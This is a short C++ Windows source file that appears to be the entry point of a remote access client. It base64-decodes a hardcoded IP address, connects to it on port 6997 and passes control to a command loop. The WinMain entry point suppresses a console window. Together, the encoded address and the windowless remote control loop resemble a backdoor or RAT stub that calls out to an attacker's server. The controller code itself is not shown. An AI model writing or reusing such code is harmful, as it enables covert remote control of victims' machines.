#include <iostream>
#include <Windows.h>

#include "connection.h"
#include "controller.h"
#include "base64.h"


int WinMain(HINSTANCE hInst, HINSTANCE prev, PSTR lpCmdLine, int nCmdShow) {
/* int main(int argc, char* argv[]) {*/
	
	std::string host = base64_decode("MTI4LjIxMS4yMzQuNTM=");
	int port = 6997;

	try {
		Connection conn(host, port);
		conn.connect();
		std::cout << "Connected to " << host << ":" << std::to_string(port).c_str() << std::endl;
		Controller controller(conn);
		controller.loop();
	} catch (asio::system_error& ex) {
		std::cerr << "Something went wrong: " << ex.what() << std::endl;
	}
}
